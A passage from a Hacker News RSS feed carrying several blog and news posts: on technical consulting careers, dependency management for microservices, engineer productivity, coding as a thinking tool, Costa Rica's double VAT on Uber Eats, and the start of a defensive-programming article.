<p>John Berryman is fond of calling consulting a â€œgateway to entrepreneurshipâ€. I think this is right, because frankly you act as a mini-entrepreneur as a consultant. Youâ€™re a sought-after domain expert that also must develop much needed marketing, sales, and client relationship skills. You care about your niche, and the marketability of your skills all the time.</p>

<p>You learn the only difference between a marketing prospect, a sales lead, and client is only the amount of resources you can devote to them. What does this mean? They all deserve an attitude of service and respect. You build a good relationship and help all of them - person reading your blog, sales inquiry, and paying client - think through tough problems through your work. <strong>You are genuine and earnest about serving people, whether they pony up money for your service!</strong></p>

<p>The genuine relationship starts with marketing: before you even talk to them. You demonstrate an attitude towards service in how you engage the market. You write non-spammy, deep, honest blog posts about your field. You give transparent, clear technical talks that barely mentions you provide a service. You do this because you genuinely want to help people. It demonstrates your trustworthiness, which only encourages prospective clients to reach out to you as an advisor in the field.</p>

<p>The relationship continues when youâ€™re contacted by a lead. Sales prospects reach out to you with your first opportunity to assist them. The sales conversation is like the first â€˜assignmentâ€™ from them by seeking your advice on a tough decision. Almost always the sales prospect is asking themselves some variant of â€œhow do I proceed on this tough challenge at my job for which you are the expert?â€.</p>

<p>You <em>must</em> give the sales prospect your best, and really focus on service for them - same as any client. This could mean recommending a competitor as a better option. It also means possibly investing time and effort, perhaps creating a demo of some possible solution that might help them decide. If there seems to be good trust building, maybe we should fly out to help them in a tricky time? If they regret the call with you in 6 months, something has gone wrong!</p>

<p>Many of the same activities in marketing &amp; sales would be exactly the same activities we would do for a client. In every situation we scale our own personal investment to the trust and resources both sides are placing into the relationship. Almost all of the work is genuinely building a human relationship, letting them know we care, we want to help them, and hereâ€™s how. Sometimes, too, that means things naturally donâ€™t work out, and thatâ€™s also OK. If this happens constantly, itâ€™s a natural market signal we need to retool our niche and focus.</p>

<p>Eventually, you hope, a client signs a contract. Here, you run the risk of taking them for granted. Think of the situation I described earlier where I had to apologize to the CTO for shoddy work by my predecessor. The â€˜apologyâ€™ I was engaging in â€“ which included a â€˜if we donâ€™t shape up, you shouldnâ€™t use usâ€™ statement on my part â€“ is not dissimilar from the kind of difficult â€˜decision pointâ€™ a sales lead is at. Both require demonstrating our sincerity, showing the possible value we can/cannot have, and helping the client with their own decision making process.</p>

<p>If weâ€™re not â€œcontinuing the saleâ€ (in other words, really â€œvaluing the relationshipâ€) weâ€™re dooming it. Like in personal life, both sides need to see what theyâ€™re getting, and it goes beyond just the delivery of working code to â€œcan I count on this person in a pinch?â€ and â€œdoes this person genuinely care about me / my success?â€</p>

<p>This focus on the relationship - where both sides invest trust and resources - is the key thing. Of course, a sales lead that drags us along and doesnâ€™t invest anything on their end, shouldnâ€™t be continued with. Same with a client that doesnâ€™t pay a fair market value. Theyâ€™re either just unable to invest the require resources or could just be taking advantage of us. However, when both sides (whether sales lead or client), show good faith and invest, you learn that consulting can be a virtuous cycle of trust, goodwill, and service. Your good clients will keep bringing you back. This is a great feeling!</p>



<p>Another colleague of mine, Spencer Ingram, has described treating your career as a startup. And the full cycle I talk about above - from investing and advertising in marketable skills, to helping prospects decide whether your skills can help them, to ultimately helping clients - is a great feedback loop for your career. Itâ€™s like youâ€™re constantly learning and interviewing for jobs. And when things <em>dont</em> work out at the â€œinterviewâ€ you still are growing your network in your industry constantly.</p>

<p>This is one of the most compelling reason to go into consulting. You are constantly examining where your field is going and repositioning - all the while growing your network.</p>

<p>This happened to me all the time. Constantly I received signals from clients on areas of focus I should grow in my field. This led to many of my decisions, like creating the Elasticsearch Learning to Rank plugin. Learning to Rank is/was a hot topic, and Elasticsearch badly needed the functionality. The information I got from clients was this was a major need: so I made sure it was marketing land I was grabbing for OpenSource Connections. I knew our skills and capabilities needed to grow in this direction, and in so doing, we could address marketing/sales/client questions that kept cropping up.</p>



<p>Consulting is great. However, thereâ€™s always a rub. And as the years wore on, I found myself increasingly less excited by some of the rougher aspects of high-end technical consulting, ultimately making a switch to a different role:</p>

<h2 id="feast-or-famine-sales-cycles">Feast-or-famine sales cycles:</h2>

<p>You have to gird yourself for a feast and famine reality. So you can tend to overdo it to make sure you have enough hour to bill. This means you can burn yourself out, trying to do what I just described in the sections above: trying to show too many clients you do truly care. You can easily overextend yourself worried that in 4 weeks you have no billable time. Then have it turn out youâ€™ve oversold your time to clients. It can be hard to know when to take a vacation in this situation!</p>

<h2 id="rejection-during-sales">Rejection during sales:</h2>

<p>Thereâ€™s an emotional roller-coaster ride to first the excitement of the original call â€œBigName client has X hard problemâ€ to the let down later on of â€œit turns out they found another vendorâ€ or â€œwe canâ€™t work with these people cause of onerous contract language, and their lawyers wonâ€™t bendâ€. This feeds the feast-or-famine thinking. Itâ€™s also just a let-down: you were really excited about that problem! It seemed you and the client clicked! What went wrong? Often itâ€™s things out of our control.</p>

<h2 id="becoming-too-attached-to-a-solution-or-vision">Becoming TOO attached to a solution or vision</h2>

<p>One of the hardest things in consulting is that weâ€™re really tourists. Our role isnâ€™t <em>really</em> to deliver working code, per-se, in the same way as a normal, day-to-day technical. Often instead, our role is to help clients make decisions and educate them. Itâ€™s human to develop an attachment to one solution, vision, mindset, and to see it as TheWayForward:â„¢: only to have politics, â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://softwaredoug.com/blog/2020/12/22/hack-your-career-with-consulting.html">https://softwaredoug.com/blog/2020/12/22/hack-your-career-with-consulting.html</a></em></p>]]>
            </description>
            <link>https://softwaredoug.com/blog/2020/12/22/hack-your-career-with-consulting.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509340</guid>
            <pubDate>Tue, 22 Dec 2020 18:18:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why distributed apps need dependency management]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509223">thread link</a>) | @mooreds
<br/>
December 22, 2020 | https://www.architect.io/blog/why-distributed-apps-need-dependency-management | <a href="https://web.archive.org/web/*/https://www.architect.io/blog/why-distributed-apps-need-dependency-management">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><img src="https://www.architect.io/images/blog/why-distributed-apps-need-dependency-management/dependency-mgmt@2x.png" alt="Dependency management"></p>
<p>Distributed cloud applications (aka microservices) have introduced an enormous
amount of complexity into the design and operation of cloud software. What used
to manifest itself as complexity hidden within a single process or runtime now
finds itself spread across tens or hundreds of loosely coupled services. While
all of these services can use different languages and can scale independently
from one another, the distributed nature can often make the app as a whole hard
to navigate, hard to deploy, and hard secure.</p>
<p>This new complexity makes it increasingly difficult to manage and contribute to
cloud-native applications, and beckons questions as to how we can maintain
healthy cloud software. How can we take advantage of the benefits of
service-oriented design without introducing friction and cost elsewhere?</p>
<p>Fortunately we've run into this problem before. Microservices aren't the first
pattern that has forced developers to figure out how to collaborate and
contribute to endless webs of interconnected components. For the last few
decades the solution has been the same: <strong>dependency management</strong>.</p>
<p>We use dependency managers every day to re-use public and private software
packages, build upon the work of others, and gracefully encapulate the details
of our own work into consumable formats. There are a number of reasons why
dependency management is the key to unlocking the power of distributed software,
and it's high time we learn from the past to power the future of cloud-native
development.</p>
<h2 id="1-developer-collaboration"><a href="#1-developer-collaboration" aria-label="1 developer collaboration permalink"></a>1. Developer collaboration</h2>
<p>One of the most important functions of dependency managers like
<a href="https://www.npmjs.com/">NPM</a>, <a href="https://pip.pypa.io/">Pip</a>,
<a href="https://maven.apache.org/what-is-maven.html">Maven</a>, and others, is to broker
collaboration amongst developers. By providing a consistent packaging mechanic
that seamlessly enables code to be extended, dependency managers have enabled
otherwise unrelated teams to consume each other's work. While these tools can be
used within the walls of enterprises to enable teams to publish and collaborate
on their work, we've seen dependency managers used at a much grander scale to
broker collaboration within the open-source community. The consistency of the
tooling and width of adoption has enabled the creation of enormously powerful
and freely accessible libraries for all to use and continue to build upon.</p>
<p>While this level of collaboration has been realized within the communities for
individual languages (NPM for Javascript, Pip for Python, etc.), it has yet to
be fully realized within the cloud-native community. We fortunately have Docker
to create consistency in how cloud services are packaged, but containers don't
have enough information about the relationships between services to resolve and
extend dependencies. Adding proper dependency management to index and resolve
relationships to peer apps and services is critical if we want to realize for
microservices what others already do with libraries in individual languages.</p>
<h2 id="2-self-service-environments"><a href="#2-self-service-environments" aria-label="2 self service environments permalink"></a>2. Self-service environments</h2>
<p>The collaborative effects of dependency managers don't happen by magic. The main
reason consistent dependency resolvers are so powerful is because developers all
around the world are able to reproduce their effects using the same commands and
processes. Reproducibility is a key element of dependency managers. Without it,
no one would be able to download and operate libraries and packages created by
others without complex, custom bootstrapping logic â€“ the creation of which would
be an enormous barrier to adoption and distribution.</p>
<p>Service-oriented applications are no different from language-specific libraries
in this regard. Our ability to extend the work of others is predicated on our
ability to run or otherwise access the services and applications we hope to make
calls to. Teams have been able to make due by operating centralized QA or
sandbox environments, but the inability to reproduce these environments creates
a new set of problems. Engineers can't operate their own development
environments, services that depend on others can't be easily shipped, developers
are forced to write their own scripts to run their app locally and remotely, and
every team needs to about production-grade tools, networking, and network
security. By leveraging a consistent, dependency management solution, teams need
only to assert the network dependencies for their services to give everyone in
the org a consistent way to spin up services in their stack along with its
dependencies â€“ allowing everyone to operate their own environments.</p>
<h2 id="3-automation"><a href="#3-automation" aria-label="3 automation permalink"></a>3. Automation</h2>
<p>The self-service benefits of consistent dependency management doesn't just mean
that developers can operate their own environments. It also means that
environments can be provisioned and torn down through automation. The
consistency of a single command or process to resolve dependencies, enrich
networking, and automate security is the perfect recipe for integration into
CI/CD pipelines!</p>
<p>If every service can be run consistently (e.g. with container platforms) and is
aware of its own dependencies, new environments can be provisioned for each
merge request and changes can be seamlessly promoted into staging and production
when merged into relevant branches. This means that every team can achieve
scalable
<a href="https://thenewstack.io/what-is-gitops-and-why-it-might-be-the-next-big-thing-for-devops/">GitOps</a>
for every developer and every new service added to the application.</p>
<h2 id="4-security"><a href="#4-security" aria-label="4 security permalink"></a>4. Security</h2>
<p>One of the risks introduced by microservice architectures is the need for each
service to expose APIs that broker access to their functionality. Since these
services live as separate processes, communication over a network is one of the
only ways for them to connect to each other and receive requests for processing.
This means that each new service exposes an interface that can be accessed by
others, and if developers aren't careful they can accidentally expose it to the
wrong parties.</p>
<p><img src="https://www.architect.io/images/blog/why-distributed-apps-need-dependency-management/declare-data-breach.webp" alt="Cloud Security"></p>
<p>Preventing accidental exposure of network interfaces is yet another area where
dependency management can provide support. With developers providing a
structured index of their own service's network dependencies, not only can we
automatically resolve those dependencies, but we can also enrich the environment
with the corresponding network policies required to lock it down â€“ only services
that depend on each other can access each other. This structured approach
drastically reduces the need for developers to understand network security
tooling, and opens them up to create new services more freely.</p>
<h2 id="5-flexibility"><a href="#5-flexibility" aria-label="5 flexibility permalink"></a>5. Flexibility</h2>
<p>Another benefit of dependency management with respect to microservices and
distributed applications is flexibility. With developers capturing the details
of their immediate dependencies and associating them with their own services,
the resolver itself is free to instrument the relationships in unique ways in
each environment that gets deployed. Want to try out a different API gateway or
service mesh? Want to instrument distributed tracing by capturing ingress and
egress traffic from each service? With automation that can hook into the
dependency resolver, operators are free to experiment with new tools and configs
without any code changes to existing services or distractions for developers.</p>
<h2 id="why-doesnt-it-already-exist"><a href="#why-doesnt-it-already-exist" aria-label="why doesnt it already exist permalink"></a>Why doesn't it already exist?</h2>
<p>Dependency resolution would be an enormously powerful tool solution to enable
developers to collaborate and contribute to cloud-native applications, but can't
we use the vast number of package managers that already exist to help with
instrumentation? While it would be nice to use existing tools, resolving
dependencies for networked applications isn't the same as resolving the
relationships between libraries and binaries.</p>
<p>The download of code artifacts that fulfill dependency requirements for
libraries all happens at build-time to create one master binary/library.
Microservices however don't get bundled into single binaries and instead need to
be run as independent services and then connected to over a network. This means
that the resolution strategy has additional steps, and happens at an entirely
different lifecycle stage than regular libraries. Turns out, the earliest point
in an application lifecycle that we can properly resolve dependencies for
distributed applications is at deploy-time. It is at this point that we know
both the relationships between all services in the stack as well as the tooling
and details of the target environment needed to properly provision and connect
services.</p>
<p>To sum it up, it's hard to create a large scale resolver for network
dependencies, but doing so would provide enormous benefits to engineering teams
and the cloud community as a whole. If we're to properly navigate the growing
landscape of cloud-native tools, we'll need to learn from dependency management
practices of the past.</p></div></div></div>]]>
            </description>
            <link>https://www.architect.io/blog/why-distributed-apps-need-dependency-management</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509223</guid>
            <pubDate>Tue, 22 Dec 2020 18:07:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Small Difference in Developer Productivity Can Amplify over Time]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509084">thread link</a>) | @adamhearn
<br/>
December 22, 2020 | https://somehowmanage.com/2020/12/08/your-fastest-engineer-may-not-be-as-fast-as-you-think/ | <a href="https://web.archive.org/web/*/https://somehowmanage.com/2020/12/08/your-fastest-engineer-may-not-be-as-fast-as-you-think/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-331">

	

	
	<div>
		
<p>Small differences in the productivity of software developers on a team can easily magnify themselves over time.</p>



<p>On many software teams, one engineer seems significantly faster than the others. Now, in some cases, itâ€™s because that engineer is cutting corners left and right. They get stuff done, but they cause damage. Theyâ€™re a <a href="https://www.linkedin.com/pulse/tactical-tornado-jacob-dreyer/">tactical tornado</a>.</p>



<p>Letâ€™s assume your fastest engineer isnâ€™t that type. They put out good code. Itâ€™s possible that theyâ€™re not actually as fast as you think. It turns out that even a marginal advantage for one engineer can translate into significant speed differences.</p>



<p>Letâ€™s imagine a simple team of two engineers, Amy and Bob. All things equal, Amy would be 10% as fast as Bob. And by all things equal, I mean theyâ€™d produce the same quality of code, Amy would just produce 10% more. This slight speed advantage could be because sheâ€™s naturally faster, or because she joined the team earlier and hence has more context on the code.</p>



<p>That 10% difference can actually translate to a pretty large difference in output. Initially, Amy produces 10% more code. Now Bob has to increase the time he spends doing code reviews of Amyâ€™s code, and just generally keeping up with Amyâ€™s changes so he has context and can make the changes he needs to make. Which means he has less time to write code, which frees up Amy to be even more effective, which increases her output yet again.</p>



<p>Over time, this is amplified. Amy is spending most of her time writing code. Bob is spending most of his reviewing and keeping up. Amyâ€™s slight advantage turns into a much larger one. Other colleagues start to view her as the go-to person, and wonder why Bob is falling behind.</p>



<p>A good engineering manager or senior engineer can detect when thatâ€™s happening and try to correct the balance. But often the team kind of settles into a mode where Amy is assumed to be better and more productive and everything is funneled to her.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://somehowmanage.com/2020/12/08/your-fastest-engineer-may-not-be-as-fast-as-you-think/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509084</guid>
            <pubDate>Tue, 22 Dec 2020 17:54:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Coding as a Tool of Thought]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509078">thread link</a>) | @todsacerdoti
<br/>
December 22, 2020 | https://surfingcomplexity.blog/2020/12/21/coding-as-a-tool-of-thought/ | <a href="https://web.archive.org/web/*/https://surfingcomplexity.blog/2020/12/21/coding-as-a-tool-of-thought/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>With apologies to <a href="https://www.eecg.utoronto.ca/~jzhu/csc326/readings/iverson.pdf">Ken Iverson</a>.</p>



<blockquote><p>Architects draw detailed plans before a brick is laid or a nail is hammered. Programmers and software engineers donâ€™t. Can this be why houses seldom collapse and programs often crash?</p><p>Blueprints help architects ensure that what they are planning to build will work. â€œWorkingâ€ means more than not collapsing; it means serving the required purpose. Architects and their clients use blueprints to understand what they are going to build before they start building it.</p><p>But few programmers write even a rough sketch of what their programs will do before they start coding.</p><cite>Leslie Lamport, <a href="https://www.wired.com/2013/01/code-bugs-programming-why-we-need-specs/">Why We Should Build Software Like We Build Houses</a></cite></blockquote>



<blockquote><p>â€œMy instinct is to go right to the board. Iâ€™m very graphic oriented. I canâ€™t talk more than ten minutes without I [sic] start drawing pictures when weâ€™re talking about the things I do. Even if Iâ€™m talking sports, I invariably start diagramming whatâ€™s going on. I feel comfortable with it or find it very effective.â€</p><p>This designer, like the newly promoted engineer at Selco who fought to get her drafting board back, is pointing out his dependence on the visual process, of drawing both to communicate and to think out the initial design. He also states that <strong>the visual and manual thought process of drawing precedes the formulation of the written specifications for the project</strong>. Like the Selco designers and those at other sites, he emphasized the importance of drawing processes to work out ideas. [emphasis added]</p><cite>Kathryn Henderson, <a href="https://mitpress.mit.edu/books/line-and-paper">On Line and On Paper: Visual Representations, Visual Culture, and Computer Graphics in Design Engineering</a></cite></blockquote>



<p>The quote above by Kathryn Henderson illustrates how mechanical engineers use the act of drawing to help them work on the design problem. By generating sketches and drawings, they develop a better understanding of the problem they trying to solve. They use drawing as a tool to help them think, to work through the problem.</p>



<p>As software engineers, we donâ€™t work in a visual medium in the way that mechanical engineers do. And yet, we also use tools to help us think through the problem. It just so happens that the tool we use is code. I canâ€™t speak for other developers, but I certainly use the process of writing code to develop a deeper understanding of the problem Iâ€™m trying to solve. As I solve parts of the problem with code, my mental model of the problem space and solution space develops throughout the process.</p>



<p>I think we use coding this way (I certainly do), because it feels to me like the fastest way to evolve this knowledge. If I had some sort of equivalent mechanism for sketching that was faster than coding for developing my understanding, Iâ€™d use it. But I know of no mechanism thatâ€™s actually faster than coding that will let me develop my understanding of the solution Iâ€™m working on. It just so happens that the quickest solution, code, is the same medium as the artifact that will ultimately end up in production. A mechanical engineer can never ship their sketches, but we can ship our code.</p>



<p>And this is a point that I think Leslie Lamport misses. Iâ€™m personally familiar with a number of different techniques for modeling in software, including TLA+, Alloy, statecharts, and decision tables. Iâ€™ve used them all, they are excellent tools for reasoning about the complexity of the system. But none of these tools really fulfill the role that sketching does for mechanical engineers (although Alloyâ€™s fast feedback for incremental model building is a nice step in this direction).</p>



<p>TLA+ in particular is a wonderful tool. Iâ€™ve used it for things like <a href="https://github.com/lorin/tla-linearizability">understanding the linearizability paper</a>, <a href="https://github.com/lorin/epidemic-register">beating the CAP theorem</a>, <a href="https://surfingcomplexity.blog/2017/10/16/the-tortoise-and-the-hare-in-tla/">finding cycles in linked lists</a>,  <a href="https://surfingcomplexity.blog/2014/06/04/crossing-the-river-with-tla/">solving the river crossing problem</a>, and <a href="https://github.com/hwayne/lets-prove-leftpad/tree/master/tlaps">proving leftpad</a>. But if youâ€™re looking for an analogy in mechanical engineering, TLA+ is much closer to finite element analysis than it is to sketches.</p>



<p>Developers jump to coding not because they are sloppy, but because they have found it to be the most effective tool for <em>sketching</em>, for thinking about the problem and getting quick feedback as they construct their solution. And constructing a representation to develop a better understanding using the best tools they have available for the job to get quick feedback is what engineers do.</p>
	</div><div>
			<!-- .entry-auhtor -->
		<p><strong>Published</strong>
			<time datetime="2020-12-21T20:26:47-08:00">December 21, 2020</time><time datetime="2020-12-21T20:27:30-08:00">December 21, 2020</time>		</p><!-- .site-posted-on -->
	</div></div>]]>
            </description>
            <link>https://surfingcomplexity.blog/2020/12/21/coding-as-a-tool-of-thought/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509078</guid>
            <pubDate>Tue, 22 Dec 2020 17:54:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Costa Rica will tax any service including '%Uber%' in its name (Spanish)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25508933">thread link</a>) | @estebarb
<br/>
December 22, 2020 | https://observador.cr/hacienda-cobra-doble-iva-a-pedidos-de-uber-eats-desde-este-18-de-diciembre/ | <a href="https://web.archive.org/web/*/https://observador.cr/hacienda-cobra-doble-iva-a-pedidos-de-uber-eats-desde-este-18-de-diciembre/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="td_uid_76_5fe56e7c651b0">

<div>
<div id="ra-player" data-skin="https://assets.sitespeaker.com/embed/skins/default">
<p><img src="https://assets.sitespeaker.com/embed/skins/default/play-icon.png"> Escuchar este artÃ­culo</p>
</div>
<p><audio id="ra-audio" data-lang="es-US" data-voice="Amazon Miguel" data-key="3806cf2c5fb46be1c8b9deab313b2f56"></audio><br>
<span><span>Tiempo de Lectura: </span> <span>4</span> <span>minutos</span></span>Desde este 18 de diciembre, los envÃ­os de comida que solicite por medio de la plataforma Uber Eats pagados con tarjeta, tendrÃ¡n un cobro adicional del 13% en Impuesto al Valor Agregado (IVA), aunque el restaurante ya haya incluido dicho tributo en el pedido.</p>
<p>Esto significa que para una compra de Â¢5.000 mÃ¡s un servicio de entrega de Â¢1.700, la persona pagarÃ­a un total de Â¢1.605 de IVA. Lo correcto serÃ­a Â¢871 sin el cobro duplicado.</p>
<p>Sin embargo, la semana pasada Costa Rica agregÃ³ a Uber a una lista de alrededor de 30 servicios digitales transfronterizos a los que las tarjetas, tanto de dÃ©bito como de crÃ©dito, deben hacer el cobro del impuesto.</p>
<p><strong>OBSERVE MÃS: <a href="https://observador.cr/doble-impuesto-tributacion-cobro-iva-indebido-a-viajera-tica-por-reservacion-en-mexico/">Â¿Doble impuesto? TributaciÃ³n cobrÃ³ IVA indebido a viajera tica por reservaciÃ³n en MÃ©xico</a></strong></p>
<p>Giovanni Tencio, director de Inteligencia de la DirecciÃ³n General de TributaciÃ³n, explicÃ³ que cualquier transacciÃ³n que incluya la palabra â€œUberâ€ estarÃ­a entonces expuesta a un cobro adicional del 13% sobre el monto total.</p>
<p>â€œUber Eats queda incluido indirectamente. La lista dice que se debe aplicar la percepciÃ³n en toda aquella transacciÃ³n en donde aparezca esa frase (Uber). De hecho hay una circunstancia que si una empresa tiene dentro de su nombre la palabra tuberÃ­as, podrÃ­a provocar que tambiÃ©n se le cobre IVA por venir incluidas las cuatro letras Uber juntasâ€, explicÃ³.</p>
<p>En el caso de Uber Eats, uno de los nombres de facturaciÃ³n es â€œUB EATS COSTA RICA HELP.UBER.COMâ€. Desde el viernes, estÃ¡ apareciendo el cobro separado del IVA a los pagos por medio de tarjetas con este nombre.</p>
<p>Uber Eats no respondiÃ³ a una consulta de <strong>El Observador</strong> para el cierre de esta nota. Tampoco fue posible corroborar si usa otros nombres para facturar que eviten el doble cobro.</p>
<p>El cliente, en estos casos, se entera del cobro del IVA por medio de su estado de cuenta: debe reflejar por un lado el monto de la compra del servicio digital y por otro, el IVA asociado a esa compra.</p>
<figure id="attachment_195506" aria-describedby="caption-attachment-195506"><img loading="lazy" src="https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-09.28.31.png" alt="Doble IVA en Uber Eats" width="912" height="166" srcset="https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-09.28.31.png 912w, https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-09.28.31-300x55.png 300w, https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-09.28.31-768x140.png 768w, https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-09.28.31-696x127.png 696w" sizes="(max-width: 912px) 100vw, 912px"><figcaption id="caption-attachment-195506">Desde este 18 de diciembre, el estado de cuenta de un tarjetahabiente refleja un cobro total a travÃ©s de Uber Eats asÃ­ como un pago adicional del 13% del IVA cobrado sobre el total de cada transacciÃ³n. (CortesÃ­a)</figcaption></figure>
<h3>Doble IVA</h3>
<p>Tencio explicÃ³ que Uber Eats no incluye IVA sobre el monto del servicio de entrega. MÃ¡s bien, solo la comida incluye el pago de IVA, cuando es un pedido de un restaurante formal.</p>
<p>Como ejemplo, Tencio puso un â€˜comboâ€™ de Â¢5.000 que pagarÃ­a 13% del IVA en el restaurante, es decir, Â¢650. En este caso, el restaurante cobra Â¢5.650.</p>
<p>Sin embargo, la plataforma ademÃ¡s incluye Â¢1.700 por el servicio de entrega, al que no le aplica el IVA. Entonces, esta persona pagaba un total de Â¢7.350 por medio de la plataforma, antes del 18 de diciembre.</p>
<p>Pero, a partir de esa fecha, la tarjeta le cobra el 13% sobre este monto total, es decir, otros Â¢955,5 adicionales del IVA.</p>
<figure id="attachment_195496" aria-describedby="caption-attachment-195496"><img loading="lazy" src="https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-12.50.17.png" alt="Doble IVA" width="582" height="337" srcset="https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-12.50.17.png 582w, https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-12.50.17-300x174.png 300w" sizes="(max-width: 582px) 100vw, 582px"><figcaption id="caption-attachment-195496">Ejemplo de un cobro duplicado del IVA, segÃºn Giovanni Tencio, director de Inteligencia de la DirecciÃ³n General de TributaciÃ³n. (CortesÃ­a TributaciÃ³n)</figcaption></figure>
<p>Sumando estos dos cobros, la persona entonces termina pagando Â¢8.305,5 incluyendo Â¢1.605 de IVA. Es decir, el impuesto representa un 24% sobre lo que consumiÃ³.</p>
<p>Lo correcto serÃ­a aplicar el IVA sobre el costo de la comida y sobre el servicio <em>express</em>. En este caso corresponderÃ­a a un IVA de Â¢871 sobre el total de Â¢6.700 de ambos rubros, lo que suma Â¢7.571.</p>
<p>Tencio aceptÃ³ que el consumidor tendrÃ­a el derecho de que le devuelvan elcobro duplicado del IVA. En este caso, Â¢734,50.</p>
<h3>Efecto â€œIndeseadoâ€</h3>
<p>Este resulta ser el efecto â€œindeseadoâ€ del cobro del impuesto que reciÃ©n empiezan a introducir algunos paÃ­ses en LatinoamÃ©rica, segÃºn Tencio.</p>
<p>Los problemas se evitarÃ­an si las plataformas se registran como contribuyentes en Costa Rica, explicÃ³. Al cobrar ellas el impuesto, pueden distinguir entre servicios fuera de Costa Rica y transacciones que ya incluyen IVA para evitar los cobros indebidos.</p>
<p>â€œEsperarÃ­amos que la inclusiÃ³n en la lista pueda ser aliciente para que estas compaÃ±Ã­as se inscriban porque claramente esto les da una afectaciÃ³n (â€¦) Le quita competitividad a la plataformaâ€, segÃºn Tencio.</p>
<p>Las empresas que se vayan inscribiendo se eliminarÃ­an o no se agregarÃ­an a la lista de servicios transfronterizos. Sin embargo, por el momento solo Amazon, la plataforma de datos financieros Bloomberg y la empresa de software McAfee han avanzado en el proceso de inscripciÃ³n.</p>
<p><strong>OBSERVE MÃS:&nbsp;<a href="https://observador.cr/taxistas-reaccionan-en-contra-de-cobro-de-iva-a-uber-y-didi-por-que/">Taxistas reaccionan en contra de cobro de IVA a Uber y Didi</a></strong></p>
<p>Mientras tanto, TributaciÃ³n considera que no se justifica dar una â€œespecie de exenciÃ³nâ€ al impuesto por la complejidad del doble cobro, segÃºn Tencio.</p>
<p>â€œUber como compaÃ±Ã­a tiene la soluciÃ³n a esto: regÃ­strese, ofrezca las garantÃ­as que se requieren, que en realidad son mÃ­nimas, y cobre usted el IVAâ€, dijo.</p>
<p>Desde introducir el impuesto sobre una primera lista de servicios el 1 de octubre, se han recaudado alrededor de Â¢2.500 millones. Con la inclusiÃ³n de los nuevos operadores a partir del 18 de diciembre, incluyendo Uber, espera ademÃ¡s un â€œsalto muy amplioâ€, agregÃ³.</p>

<h3>AfectaciÃ³n a consumidores</h3>
<p>Mientras tanto, Tencio seÃ±alÃ³ que TributaciÃ³n pretende simplificar el proceso de devoluciÃ³n de cobros indebidos a los consumidores.</p>
<p>En noviembre, TributaciÃ³n sacÃ³ en consulta un resoluciÃ³n para simplificar la tramitologÃ­a interna que espera avanzar en el 2021.</p>
<p>EspecÃ­ficamente, pretende evitar que primero se tenga que verificar las deudas por otros impuestos de la persona, para hacer una â€œcompensaciÃ³nâ€ del impuesto.</p>
<p>Para montos pequeÃ±os, es posible que se tramite con el comprobante que emite la plataforma y la copia del estado de cuenta donde aparece el cobro.</p>
<p>Mientras que, montos grandes, es posible que se deba hacer la consulta al banco que verifique que la transacciÃ³n es legitima, explicÃ³ Tencio.</p>
<blockquote data-secret="VcaM5OjXgW"><p><a href="https://observador.cr/tributacion-espera-que-amazon-empiece-a-cobrar-iva-a-servicios-digitales-directamente-en-enero/">TributaciÃ³n espera que Amazon empiece a cobrar directamente el IVA a servicios digitales en enero</a></p></blockquote>

<hr>
<h4>Traducir artÃ­culo</h4>











</div></div></div>]]>
            </description>
            <link>https://observador.cr/hacienda-cobra-doble-iva-a-pedidos-de-uber-eats-desde-este-18-de-diciembre/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508933</guid>
            <pubDate>Tue, 22 Dec 2020 17:41:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Defensive Programming]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25508896">thread link</a>) | @tyhoff
<br/>
December 22, 2020 | https://interrupt.memfault.com/blog/defensive-and-offensive-programming | <a href="https://web.archive.org/web/*/https://interrupt.memfault.com/blog/defensive-and-offensive-programming">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        <p>One of the worst things about embedded development (especially in C) is
receiving a return value of <code>-1</code> or <code>unknown_error</code> from a function, with no
other information about why the failure took place. It provides no information
about where the error bubbled up from!</p>

<p>Weâ€™ve all been here as embedded developers, bringing up new boards, drivers,
modules, and applications, wondering why and how we got into this mess. Root
causing these issues is like peeling an onion: each layer we dig through while
debugging, we smile a bit less and a few more tears are shed. These sorts of
issues are often a result of developer error, either calling functions out of
